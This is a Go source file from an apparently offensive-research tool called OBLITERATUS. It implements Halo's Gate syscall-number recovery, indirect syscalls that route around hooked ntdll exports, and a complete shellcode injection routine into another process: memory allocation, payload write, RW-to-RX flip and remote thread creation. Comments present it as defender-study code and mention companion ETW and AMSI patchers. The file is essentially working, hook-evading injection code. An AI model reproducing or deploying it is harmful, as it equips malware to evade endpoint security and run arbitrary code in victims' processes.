//go:build windows && amd64

// Package research contains the documented offensive-research primitives of
// OBLITERATUS: the Halo's Gate indirect-syscall bridge (EnergyFlow) and the
// process-injection routine that exercises it.
//
// This code exists so defenders can study the exact primitive — SSN
// resolution, indirect execution through an ntdll syscall gadget, and W^X
// page-state transitions — in a readable, reviewable form. It is NOT
// compiled into any active path: the HTTP route for it only answers when the
// operator starts the tool with --enable-inject, and it only acts on a PID
// the operator explicitly selected on their own machine.
//
// Technique references: Halo's Gate (SSN recovery around a hooked export),
// T1055 (Process Injection), T1106 (Native API).
package research

import (
	"encoding/binary"
	"errors"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/DevCop95/obliteratus/internal/winname"
)

// EnergyFlow executes one indirect syscall: it loads the System Service
// Number into EAX, maps the Go arguments to the Windows x64 calling
// convention (RCX/R10, RDX, R8, R9 + 32 bytes of shadow space) and jumps to
// a `syscall; ret` gadget inside ntdll instead of executing the (possibly
// hooked) export prologue.
//
// Implemented in energyflow_amd64.s. Returns the NTSTATUS of the syscall.
func EnergyFlow(a1 uintptr, id uint32, ep uintptr, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uint32

var (
	procOpenProcess = kernel32.NewProc(winname.OpenProc)
	procCloseHandle = kernel32.NewProc(winname.CloseH)
)

const (
	processAllAccess = 0x1F0FFF
	memCommitReserve = 0x3000 // MEM_COMMIT | MEM_RESERVE
	// pageReadWrite / pageExecuteRead live in dll_windows.go (shared with the
	// ETW and AMSI patchers); no RWX page ever exists (W^X).
)

// resolved is a System Service Number plus the address of a usable
// `syscall` gadget for that service.
type resolved struct {
	id   uint32
	addr uintptr
}

// ntdllStatus converts an NTSTATUS into a Go error when the high bit is set
// (severity = ERROR/FATAL).
func ntdllStatus(what string, st uint32) error {
	if st&0x80000000 == 0 {
		return nil
	}
	return fmt.Errorf("%s failed: NTSTATUS 0x%08X", what, st)
}

// scanGadget copies 32 bytes of the stub at a out of our own address space
// (via ReadProcessMemory, so a slot outside mapped memory degrades to "not a
// gadget" instead of an access violation) and looks for the canonical ntdll
// syscall stub: `4C 8B D1` (mov r10,rcx), `B8 <ssn>` (mov eax,ssn), plus the
// first `0F 05` (syscall) instruction.
//
// Returns the SSN together with the address of that syscall gadget.
func scanGadget(a uintptr) (uint32, uintptr) {
	var b [32]byte
	var read uintptr
	if err := windows.ReadProcessMemory(windows.CurrentProcess(), a, &b[0], uintptr(len(b)), &read); err != nil || read != uintptr(len(b)) {
		return 0, 0
	}
	if b[0] == 0x4C && b[1] == 0x8B && b[2] == 0xD1 && b[3] == 0xB8 {
		ssn := binary.LittleEndian.Uint32(b[4:8])
		for i := 0; i < 31; i++ {
			if b[i] == 0x0F && b[i+1] == 0x05 {
				return ssn, a + uintptr(i)
			}
		}
	}
	return 0, 0
}

// resolve performs Halo's Gate: it reads the SSN directly from the export's
// stub and, if that stub is hooked (patched prologue), walks ±32-byte slots
// looking for a neighbouring clean stub, adjusting the SSN by the slot
// distance — the technique that gives the method its name.
func resolve(name string) (resolved, error) {
	p := ntdll.NewProc(name)
	if err := p.Find(); err != nil {
		return resolved{}, fmt.Errorf("ntdll!%s: %w", name, err)
	}
	start := p.Addr()

	if ssn, gadget := scanGadget(start); gadget != 0 {
		return resolved{ssn, gadget}, nil
	}
	for i := 1; i < 32; i++ {
		if ssn, gadget := scanGadget(start - uintptr(i*32)); gadget != 0 {
			return resolved{ssn + uint32(i), gadget}, nil
		}
		if ssn, gadget := scanGadget(start + uintptr(i*32)); gadget != 0 {
			return resolved{ssn - uint32(i), gadget}, nil
		}
	}
	return resolved{}, fmt.Errorf("ntdll!%s: no clean syscall gadget found within ±31 slots", name)
}

// Inject maps payload into the target process and starts a thread on it,
// using only indirect syscalls:
//
//	NtAllocateVirtualMemory  → RW  (0x04) — never RWX
//	NtWriteVirtualMemory     → copy shellcode
//	NtProtectVirtualMemory    → RX  (0x20) — W^X transition
//	NtCreateThreadEx          → execute at base
//	NtClose                   → drop handles (no kernel object linkage left)
//
// Returns an error if any stage fails; partial allocations are closed.
func Inject(pid int, payload []byte) error {
	if pid <= 0 {
		return errors.New("inject: invalid target pid")
	}
	if len(payload) == 0 {
		return errors.New("inject: empty payload")
	}

	alloc, err := resolve(winname.NtAllocVM)
	if err != nil {
		return err
	}
	write, err := resolve(winname.NtWriteVM)
	if err != nil {
		return err
	}
	protect, err := resolve(winname.NtProtectVM)
	if err != nil {
		return err
	}
	createThread, err := resolve(winname.NtCreateTh)
	if err != nil {
		return err
	}
	closeHandle, err := resolve(winname.NtClose)
	if err != nil {
		return err
	}

	proc, _, callErr := procOpenProcess.Call(processAllAccess, 0, uintptr(pid))
	if proc == 0 {
		return fmt.Errorf("inject: %s(%d) failed: %v", winname.OpenProc, pid, callErr)
	}
	defer procCloseHandle.Call(proc)

	// Phase 1: allocate RW memory (no execute permission yet).
	var base uintptr
	size := uintptr(len(payload))
	st := EnergyFlow(proc, alloc.id, alloc.addr,
		uintptr(unsafe.Pointer(&base)), 0,
		uintptr(unsafe.Pointer(&size)), memCommitReserve, pageReadWrite,
		0, 0, 0, 0, 0)
	if err := ntdllStatus(winname.NtAllocVM, st); err != nil {
		return err
	}
	if base == 0 {
		return errors.New("inject: allocation returned NULL base")
	}

	// Phase 2: write the payload.
	st = EnergyFlow(proc, write.id, write.addr,
		base, uintptr(unsafe.Pointer(&payload[0])), size,
		0, 0, 0, 0, 0, 0, 0)
	if err := ntdllStatus(winname.NtWriteVM, st); err != nil {
		EnergyFlow(proc, closeHandle.id, closeHandle.addr, proc, 0, 0, 0, 0, 0, 0, 0, 0, 0)
		return err
	}

	// Phase 3: flip RW → RX (W^X: the page is never RWX at any instant).
	var oldProtect uint32
	st = EnergyFlow(proc, protect.id, protect.addr,
		uintptr(unsafe.Pointer(&base)), uintptr(unsafe.Pointer(&size)),
		pageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)),
		0, 0, 0, 0, 0, 0)
	if err := ntdllStatus(winname.NtProtectVM, st); err != nil {
		return err
	}

	// Phase 4: start execution and close the thread handle immediately.
	var thread uintptr
	st = EnergyFlow(uintptr(unsafe.Pointer(&thread)), createThread.id, createThread.addr,
		processAllAccess, 0, proc, base,
		0, 0, 0, 0, 0, 0)
	if err := ntdllStatus(winname.NtCreateTh, st); err != nil {
		return err
	}
	if thread != 0 {
		EnergyFlow(thread, closeHandle.id, closeHandle.addr, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
	}
	return nil
}
